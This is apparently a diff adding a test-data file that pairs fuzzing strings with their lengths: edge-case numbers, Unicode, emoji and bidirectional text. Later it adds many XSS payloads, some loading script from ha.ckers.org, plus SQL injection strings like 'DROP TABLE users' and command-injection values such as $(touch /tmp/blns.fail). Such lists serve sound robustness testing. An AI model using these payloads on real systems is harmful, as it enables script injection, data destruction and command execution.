@@ -1,0 +1,510 @@
+﻿length
+
+ => 0
+undefined => 9
+undef => 5
+null => 4
+NULL => 4
+(null) => 6
+nil => 3
+NIL => 3
+true => 4
+false => 5
+True => 4
+False => 5
+TRUE => 4
+FALSE => 5
+None => 4
+hasOwnProperty => 14
+\ => 1
+\\ => 2
+0 => 1
+1 => 1
+1.00 => 4
+$1.00 => 5
+1/2 => 3
+1E2 => 3
+1E02 => 4
+1E+02 => 5
+-1 => 2
+-1.00 => 5
+-$1.00 => 6
+-1/2 => 4
+-1E2 => 4
+-1E02 => 5
+-1E+02 => 6
+1/0 => 3
+0/0 => 3
+-2147483648/-1 => 14
+-9223372036854775808/-1 => 23
+-0 => 2
+-0.0 => 4
++0 => 2
++0.0 => 4
+0.00 => 4
+0..0 => 4
+. => 1
+0.0.0 => 5
+0,00 => 4
+0,,0 => 4
+, => 1
+0,0,0 => 5
+0.0/0 => 5
+1.0/0.0 => 7
+0.0/0.0 => 7
+1,0/0,0 => 7
+0,0/0,0 => 7
+--1 => 3
+- => 1
+-. => 2
+-, => 2
+999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999 => 96
+NaN => 3
+Infinity => 8
+-Infinity => 9
+INF => 3
+1#INF => 5
+-1#IND => 6
+1#QNAN => 6
+1#SNAN => 6
+1#IND => 5
+0x0 => 3
+0xffffffff => 10
+0xffffffffffffffff => 18
+0xabad1dea => 10
+123456789012345678901234567890123456789 => 39
+1,000.00 => 8
+1 000.00 => 8
+1'000.00 => 8
+1,000,000.00 => 12
+1 000 000.00 => 12
+1'000'000.00 => 12
+1.000,00 => 8
+1 000,00 => 8
+1'000,00 => 8
+1.000.000,00 => 12
+1 000 000,00 => 12
+1'000'000,00 => 12
+01000 => 5
+08 => 2
+09 => 2
+2.2250738585072011e-308 => 23
+,./;'[]\-= => 10
+<>?:"{}|_+ => 10
+!@#$%^&*()`~ => 12
+ => 27
+ => 31
+\t\u000b\f              ​ 
+ => 29
+­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿 => 260
+﻿ => 1
+￾ => 1
+Ω≈ç√∫˜µ≤≥÷ => 10
+åß∂ƒ©˙∆˚¬…æ => 11
+œ∑´®†¥¨ˆøπ“‘ => 12
+¡™£¢∞§¶•ªº–≠ => 12
+¸˛Ç◊ı˜Â¯˘¿ => 10
+ÅÍÎÏ˝ÓÔÒÚÆ☃ => 12
+Œ„´‰ˇÁ¨ˆØ∏”’ => 12
+`⁄€‹›ﬁﬂ‡°·‚—± => 13
+⅛⅜⅝⅞ => 4
+ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя => 79
+٠١٢٣٤٥٦٧٨٩ => 10
+⁰⁴⁵ => 3
+₀₁₂ => 3
+⁰⁴⁵₀₁₂ => 6
+ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ => 269
+' => 1
+" => 1
+'' => 2
+"" => 2
+'"' => 3
+"''''"'" => 8
+"'"'"''''" => 10
+<foo val=“bar” /> => 17
+<foo val=“bar” /> => 17
+<foo val=”bar“ /> => 17
+<foo val=`bar' /> => 17
+田中さんにあげて下さい => 11
+パーティーへ行かないか => 11
+和製漢語 => 4
+部落格 => 3
+사회과학원 어학연구소 => 11
+찦차를 타고 온 펲시맨과 쑛다리 똠방각하 => 22
+社會科學院語學研究所 => 10
+울란바토르 => 5
+𠜎𠜱𠝹𠱓𠱸𠲖𠳏 => 14
+Ⱥ => 1
+Ⱦ => 1
+ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ  => 18
+(｡◕ ∀ ◕｡) => 9
+｀ｨ(´∀｀∩ => 7
+__ﾛ(,_,*) => 9
+・(￣∀￣)・:*: => 10
+ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ => 16
+,。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’ => 26
+(╯°□°）╯︵ ┻━┻) => 13
+(ﾉಥ益ಥ）ﾉ﻿ ┻━┻ => 12
+┬─┬ノ( º _ ºノ) => 13
+( ͡° ͜ʖ ͡°) => 11
+😍 => 2
+👩🏽 => 4
+👾 🙇 💁 🙅 🙆 🙋 🙎 🙍 => 23
+🐵 🙈 🙉 🙊 => 11
+❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙 => 44
+✋🏿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿 => 28
+🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧 => 23
+0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟 => 42
+🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸 => 21
+🇺🇸🇷🇺🇸🇦🇫🇦🇲 => 18
+🇺🇸🇷🇺🇸🇦 => 12
+１２３ => 3
+١٢٣ => 3
+ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو. => 186
+בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ => 60
+הָיְתָהtestالصفحات التّحول => 26
+﷽ => 1
+ﷺ => 1
+مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ،  => 118
+​ => 1
+  => 1
+᠎ => 1
+　 => 1
+﻿ => 1
+␣ => 1
+␢ => 1
+␡ => 1
+‪‪test‪ => 7
+‫test‫ => 6
+ test  => 6
+test⁠test‫ => 10
+⁦test⁧ => 6
+Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣ => 210
+̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰ => 143
+̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟ => 211
+̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕ => 151
+Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮ => 26
+˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥ => 123
+00˙Ɩ$- => 6
+Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ => 43
+𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠 => 78
+𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌 => 78
+𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐𝒘𝒏 𝒇𝒐𝒙 𝒋𝒖𝒎𝒑𝒔 𝒐𝒗𝒆𝒓 𝒕𝒉𝒆 𝒍𝒂𝒛𝒚 𝒅𝒐𝒈 => 78
+𝓣𝓱𝓮 𝓺𝓾𝓲𝓬𝓴 𝓫𝓻𝓸𝔀𝓷 𝓯𝓸𝔁 𝓳𝓾𝓶𝓹𝓼 𝓸𝓿𝓮𝓻 𝓽𝓱𝓮 𝓵𝓪𝔃𝔂 𝓭𝓸𝓰 => 78
+𝕋𝕙𝕖 𝕢𝕦𝕚𝕔𝕜 𝕓𝕣𝕠𝕨𝕟 𝕗𝕠𝕩 𝕛𝕦𝕞𝕡𝕤 𝕠𝕧𝕖𝕣 𝕥𝕙𝕖 𝕝𝕒𝕫𝕪 𝕕𝕠𝕘 => 78
+𝚃𝚑𝚎 𝚚𝚞𝚒𝚌𝚔 𝚋𝚛𝚘𝚠𝚗 𝚏𝚘𝚡 𝚓𝚞𝚖𝚙𝚜 𝚘𝚟𝚎𝚛 𝚝𝚑𝚎 𝚕𝚊𝚣𝚢 𝚍𝚘𝚐 => 78
+⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢ => 43
+<script>alert(123)</script> => 27
+&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt; => 50
+<img src=x onerror=alert(123) /> => 32
+<svg><script>123<1>alert(123)</script> => 38
+"><script>alert(123)</script> => 29
+'><script>alert(123)</script> => 29
+><script>alert(123)</script> => 28
+</script><script>alert(123)</script> => 36
+< / script >< script >alert(123)< / script > => 44
+ onfocus=JaVaSCript:alert(123) autofocus => 40
+" onfocus=JaVaSCript:alert(123) autofocus => 41
+' onfocus=JaVaSCript:alert(123) autofocus => 41
+＜script＞alert(123)＜/script＞ => 27
+<sc<script>ript>alert(123)</sc</script>ript> => 44
+--><script>alert(123)</script> => 30
+";alert(123);t=" => 16
+';alert(123);t=' => 16
+JavaSCript:alert(123) => 21
+;alert(123); => 12
+src=JaVaSCript:prompt(132) => 26
+"><script>alert(123);</script x=" => 33
+'><script>alert(123);</script x=' => 33
+><script>alert(123);</script x= => 31
+" autofocus onkeyup="javascript:alert(123) => 42
+' autofocus onkeyup='javascript:alert(123) => 42
+<script\x20type="text/javascript">javascript:alert(1);</script> => 63
+<script\x3Etype="text/javascript">javascript:alert(1);</script> => 63
+<script\x0Dtype="text/javascript">javascript:alert(1);</script> => 63
+<script\x09type="text/javascript">javascript:alert(1);</script> => 63
+<script\x0Ctype="text/javascript">javascript:alert(1);</script> => 63
+<script\x2Ftype="text/javascript">javascript:alert(1);</script> => 63
+<script\x0Atype="text/javascript">javascript:alert(1);</script> => 63
+'`"><\x3Cscript>javascript:alert(1)</script> => 44
+'`"><\x00script>javascript:alert(1)</script> => 44
+ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF => 55
+ABC<div style="x:expression\x5C(javascript:alert(1)">DEF => 56
+ABC<div style="x:expression\x00(javascript:alert(1)">DEF => 56
+ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF => 56
+ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF => 56
+ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF => 56
+ABC<div style="x:\x09expression(javascript:alert(1)">DEF => 56
+ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF => 60
+ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF => 56
+ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF => 56
+ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\x20expression(javascript:alert(1)">DEF => 56
+ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\x00expression(javascript:alert(1)">DEF => 56
+ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF => 56
+ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF => 64
+ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF => 64
+<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 75
+<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 79
+<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a> => 71
+`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)> => 51
+`"'><img src=xxx:x \x22onerror=javascript:alert(1)> => 51
+`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)> => 51
+`"'><img src=xxx:x \x0Donerror=javascript:alert(1)> => 51
+`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)> => 51
+`"'><img src=xxx:x \x09onerror=javascript:alert(1)> => 51
+`"'><img src=xxx:x \x0Conerror=javascript:alert(1)> => 51
+`"'><img src=xxx:x \x00onerror=javascript:alert(1)> => 51
+`"'><img src=xxx:x \x27onerror=javascript:alert(1)> => 51
+`"'><img src=xxx:x \x20onerror=javascript:alert(1)> => 51
+"`'><script>\x3Bjavascript:alert(1)</script> => 44
+"`'><script>\x0Djavascript:alert(1)</script> => 44
+"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script> => 52
+"`'><script>\xE2\x80\x81javascript:alert(1)</script> => 52
+"`'><script>\xE2\x80\x84javascript:alert(1)</script> => 52
+"`'><script>\xE3\x80\x80javascript:alert(1)</script> => 52
+"`'><script>\x09javascript:alert(1)</script> => 44
+"`'><script>\xE2\x80\x89javascript:alert(1)</script> => 52
+"`'><script>\xE2\x80\x85javascript:alert(1)</script> => 52
+"`'><script>\xE2\x80\x88javascript:alert(1)</script> => 52
+"`'><script>\x00javascript:alert(1)</script> => 44
+"`'><script>\xE2\x80\xA8javascript:alert(1)</script> => 52
+"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script> => 52
+"`'><script>\xE1\x9A\x80javascript:alert(1)</script> => 52
+"`'><script>\x0Cjavascript:alert(1)</script> => 44
+"`'><script>\x2Bjavascript:alert(1)</script> => 44
+"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script> => 56
+"`'><script>-javascript:alert(1)</script> => 41
+"`'><script>\x0Ajavascript:alert(1)</script> => 44
+"`'><script>\xE2\x80\xAFjavascript:alert(1)</script> => 52
+"`'><script>\x7Ejavascript:alert(1)</script> => 44
+"`'><script>\xE2\x80\x87javascript:alert(1)</script> => 52
+"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script> => 52
+"`'><script>\xE2\x80\xA9javascript:alert(1)</script> => 52
+"`'><script>\xC2\x85javascript:alert(1)</script> => 48
+"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script> => 52
+"`'><script>\xE2\x80\x83javascript:alert(1)</script> => 52
+"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script> => 52
+"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script> => 52
+"`'><script>\xE2\x80\x80javascript:alert(1)</script> => 52
+"`'><script>\x21javascript:alert(1)</script> => 44
+"`'><script>\xE2\x80\x82javascript:alert(1)</script> => 52
+"`'><script>\xE2\x80\x86javascript:alert(1)</script> => 52
+"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script> => 52
+"`'><script>\x0Bjavascript:alert(1)</script> => 44
+"`'><script>\x20javascript:alert(1)</script> => 44
+"`'><script>\xC2\xA0javascript:alert(1)</script> => 48
+<img \x00src=x onerror="alert(1)"> => 34
+<img \x47src=x onerror="javascript:alert(1)"> => 45
+<img \x11src=x onerror="javascript:alert(1)"> => 45
+<img \x12src=x onerror="javascript:alert(1)"> => 45
+<img\x47src=x onerror="javascript:alert(1)"> => 44
+<img\x10src=x onerror="javascript:alert(1)"> => 44
+<img\x13src=x onerror="javascript:alert(1)"> => 44
+<img\x32src=x onerror="javascript:alert(1)"> => 44
+<img\x47src=x onerror="javascript:alert(1)"> => 44
+<img\x11src=x onerror="javascript:alert(1)"> => 44
+<img \x47src=x onerror="javascript:alert(1)"> => 45
+<img \x34src=x onerror="javascript:alert(1)"> => 45
+<img \x39src=x onerror="javascript:alert(1)"> => 45
+<img \x00src=x onerror="javascript:alert(1)"> => 45
+<img src\x09=x onerror="javascript:alert(1)"> => 45
+<img src\x10=x onerror="javascript:alert(1)"> => 45
+<img src\x13=x onerror="javascript:alert(1)"> => 45
+<img src\x32=x onerror="javascript:alert(1)"> => 45
+<img src\x12=x onerror="javascript:alert(1)"> => 45
+<img src\x11=x onerror="javascript:alert(1)"> => 45
+<img src\x00=x onerror="javascript:alert(1)"> => 45
+<img src\x47=x onerror="javascript:alert(1)"> => 45
+<img src=x\x09onerror="javascript:alert(1)"> => 44
+<img src=x\x10onerror="javascript:alert(1)"> => 44
+<img src=x\x11onerror="javascript:alert(1)"> => 44
+<img src=x\x12onerror="javascript:alert(1)"> => 44
+<img src=x\x13onerror="javascript:alert(1)"> => 44
+<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)"> => 46
+<img src=x onerror=\x09"javascript:alert(1)"> => 45
+<img src=x onerror=\x10"javascript:alert(1)"> => 45
+<img src=x onerror=\x11"javascript:alert(1)"> => 45
+<img src=x onerror=\x12"javascript:alert(1)"> => 45
+<img src=x onerror=\x32"javascript:alert(1)"> => 45
+<img src=x onerror=\x00"javascript:alert(1)"> => 45
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a> => 78
+<img src="x` `<script>javascript:alert(1)</script>"` `> => 55
+<img src onerror /" '"= alt=javascript:alert(1)//"> => 51
+<title onpropertychange=javascript:alert(1)></title><title title=> => 66
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>"> => 92
+<!--[if]><script>javascript:alert(1)</script --> => 48
+<!--[if<img src=x onerror=javascript:alert(1)//]> --> => 53
+<script src="/\%(jscript)s"></script> => 37
+<script src="\\%(jscript)s"></script> => 37
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"> => 40
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> => 57
+<IMG SRC=# onmouseover="alert('xxs')"> => 38
+<IMG SRC= onmouseover="alert('xxs')"> => 37
+<IMG onmouseover="alert('xxs')"> => 32
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;> => 136
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> => 217
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> => 125
+<IMG SRC="jav   ascript:alert('XSS');"> => 39
+<IMG SRC="jav&#x09;ascript:alert('XSS');"> => 42
+<IMG SRC="jav&#x0A;ascript:alert('XSS');"> => 42
+<IMG SRC="jav&#x0D;ascript:alert('XSS');"> => 42
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out => 62
+<IMG SRC=" &#14;  javascript:alert('XSS');"> => 44
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT> => 54
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")> => 51
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT> => 50
+<<SCRIPT>alert("XSS");//<</SCRIPT> => 34
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B > => 44
+<SCRIPT SRC=//ha.ckers.org/.j> => 30
+<IMG SRC="javascript:alert('XSS')" => 34
+<iframe src=http://ha.ckers.org/scriptlet.html < => 48
+\";alert('XSS');// => 18
+<u oncopy=alert()> Copy me</u> => 30
+<i onwheel=alert(1)> Scroll over me </i> => 40
+<plaintext> => 11
+http://a/%%30%30 => 16
+</textarea><script>alert(123)</script> => 38
+1;DROP TABLE users => 18
+1'; DROP TABLE users-- 1 => 24
+' OR 1=1 -- 1 => 13
+' OR '1'='1 => 11
+  => 1
+% => 1
+_ => 1
+- => 1
+-- => 2
+--version => 9
+--help => 6
+$USER => 5
+/dev/null; touch /tmp/blns.fail ; echo => 38
+`touch /tmp/blns.fail` => 22
+$(touch /tmp/blns.fail) => 23
+@{[system "touch /tmp/blns.fail"]} => 34
+eval("puts 'hello world'") => 26
+System("ls -al /") => 18
+`ls -al /` => 10
+Kernel.exec("ls -al /") => 23
